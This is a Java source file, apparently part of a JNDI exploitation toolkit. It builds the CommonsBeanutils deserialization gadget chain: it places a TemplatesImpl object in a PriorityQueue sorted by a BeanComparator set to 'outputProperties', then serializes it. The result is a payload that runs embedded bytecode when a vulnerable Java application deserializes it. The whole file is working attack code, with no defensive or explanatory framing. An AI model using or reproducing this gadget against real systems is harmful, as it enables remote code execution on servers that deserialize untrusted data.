package map.jndi.gadget;

import map.jndi.util.PackageClassLoader;
import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.lang.reflect.Constructor;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils {
    public static byte[] create(TemplatesImpl templatesImpl, String packageName) throws Exception {
        PackageClassLoader cl = new PackageClassLoader(packageName);

        Class clazz = cl.loadClass("org.apache.commons.beanutils.BeanComparator");

        Constructor constructor = clazz.getDeclaredConstructor(String.class, Comparator.class);
        Comparator beanComparator = (Comparator) constructor.newInstance(null, String.CASE_INSENSITIVE_ORDER);

        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("1");

        ReflectUtil.setFieldValue(beanComparator, "property", "outputProperties");
        ReflectUtil.setFieldValue(priorityQueue, "queue", new Object[]{templatesImpl, templatesImpl});

        return SerializeUtil.serialize(priorityQueue);
    }
}
